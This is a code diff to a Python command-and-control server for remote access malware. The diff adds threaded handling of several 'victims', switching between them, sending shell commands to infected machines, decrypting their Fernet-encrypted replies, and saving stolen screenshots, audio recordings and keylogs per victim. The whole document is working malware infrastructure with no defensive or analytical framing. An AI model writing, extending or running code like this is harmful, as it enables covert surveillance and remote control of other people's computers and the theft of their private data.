@@ -3,6 +3,9 @@ import os
 import socket
 import io
 import json
+import threading
+import cryptography.fernet as fernet
+
 from db import (
     init_db,
     insert_victim
@@ -11,9 +14,6 @@ from db import (
 parser = argparse.ArgumentParser(prog="Just a kiddie")
 parser.add_argument('--host', required=True)
 parser.add_argument('--port', required=True, type=int)
-
-cwd = "~"
-
 
 
 def start_server(host, port):
@@ -51,14 +51,12 @@ def save_received(base, category, filename, data):
     
 
 def unfold_parts(parts):
-    # just like the banner
-    # TYPE|LENGTH|EXTRA\n
-
     type = parts[0]
     length = parts[1]
-    extra = parts[2].strip()
+    extra = parts[2]
+    key = parts[3].strip()
 
-    return type, length, extra
+    return type, length, extra, key
 
 
 def recv_banner(conn):
@@ -82,49 +80,142 @@ def recv_data(conn, length):
     return data
 
 
-def main():
-    global cwd
+def decrypt_packet(data, key):
+    if not key or key == "None":
+        return data
 
-    init_db()
-    args = parser.parse_args()
-    conn, addr = start_server(args.host, args.port)
-
-    if not conn:
-        print("[!] Could not connect!")
-        return
+    try:
+        cipher_suite = fernet.Fernet(key)
+        decrypted_data = cipher_suite.decrypt(data)
+        return decrypted_data
+    
+    except Exception as e:
+        print(f"Erro ao descriptografar dados: {e}")
+        return None
     
 
-    print(f"[i] Connected to host: {addr[0]}:{addr[1]}")
-
-    user_info = get_user_info(conn=conn)
-    base = setup_storage(user_info["vic_id"])
-    insert_victim(user_info)
-
+def list_victims(victims, victims_lock):
+    with victims_lock:
+        for vid in victims:
+            print(f"  - {vid}")
 
 
-    while True:
-        cmd = str(input(f"{cwd} > "))
+def switch_victim(new_victim, victims, victims_lock):
+    with victims_lock:
+        if new_victim in victims:
+            print(f"[i] Switched to {new_victim}")
+            return new_victim
+        else:
+            print("[!] Victim not found")
+            return None
 
-        conn.send(cmd.encode())
 
-        banner = recv_banner(conn)
-        parts = banner.split("|")
+def send_command(selected, user_input, victims, victims_lock):
+    with victims_lock:
+        if selected not in victims:
+            print("[!] Selected victim disconnected")
+            return None
         
-        type, length, extra = unfold_parts(parts)
-        data = recv_data(conn, int(length))
+        victim_conn = victims[selected]['conn']
+    
+    try:
+        victim_conn.send(user_input.encode())
+        return victim_conn
+    
+    except (BrokenPipeError, ConnectionResetError):
+        print("[!] Error sending command")
+        return None
 
-        match type:
-            case "PNG":
-                save_received(base, "screenshots", extra, data)
 
-            case "WAV":
-                save_received(base, "audios", extra, data)
+def main(conn, addr, victims, victims_lock):
+    cwd = "~"
+    
+    user_info = get_user_info(conn=conn)
+    victim_id = user_info["vic_id"]
+    
+    with victims_lock:
+        victims[victim_id] = {
+            'conn': conn, 
+            'addr': addr, 
+            'cwd': cwd,
+            'base': setup_storage(victim_id)
+        }
+    
+    insert_victim(user_info)
+    print(f"[i] Connected: {addr[0]}:{addr[1]} ({victim_id})")
 
-            case "TMP":
-                save_received(base, "keylogs", extra, data)
+    selected = victim_id
+    
+    try:
+        while True:
+            with victims_lock:
+                if selected not in victims:
+                    print("[!] Selected victim disconnected")
+                    break
+                cwd = victims[selected]['cwd']
+                base = victims[selected]['base']  
+            
+            user_input = input(f"[{selected}] {cwd} > ").strip()
+            
+            if user_input == "@vics":
+                list_victims(victims, victims_lock)
+                continue
+            
+            if user_input.startswith("@"):
+                new_victim = user_input[1:]
+                new_selected = switch_victim(new_victim, victims, victims_lock)
+                
+                if new_selected:
+                    selected = new_selected
 
-            case "CWD":
-                cwd = extra
+                continue
+            
+            victim_conn = send_command(selected, user_input, victims, victims_lock)
+            if not victim_conn:
+                continue
+            
+            banner = recv_banner(victim_conn)
+            parts = banner.split("|")
+            type, length, extra, key = unfold_parts(parts)
+            received_data = recv_data(victim_conn, int(length))
+            decrypted_data = decrypt_packet(received_data, key)
 
-            case _:
-                print(data.decode())
+            match type:
+                case "PNG":
+                    save_received(base, "screenshots", extra, decrypted_data)
+                case "WAV":
+                    save_received(base, "audios", extra, decrypted_data)
+                case "TMP":
+                    save_received(base, "keylogs", extra, decrypted_data)
+                case "CWD":
+                    with victims_lock:
+                        victims[selected]['cwd'] = extra
+                case _:
+                    print(decrypted_data.decode())
+    
+    except (ConnectionResetError, BrokenPipeError):
+        print(f"[!] Victim {victim_id} disconnected")
+    
+    finally:
+        with victims_lock:
+            del victims[victim_id]
+
+
+def run():
+    init_db()
+    args = parser.parse_args()
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((args.host, args.port))
+    server.listen(5)
+
+    victims = {}
+    victims_lock = threading.Lock() 
+    
+    while True:
+        conn, addr = server.accept()
+        thread = threading.Thread(target=main, args=(conn, addr, victims, victims_lock), daemon=True)
+        thread.start()
+
+
+if __name__ == "__main__":
+    run()
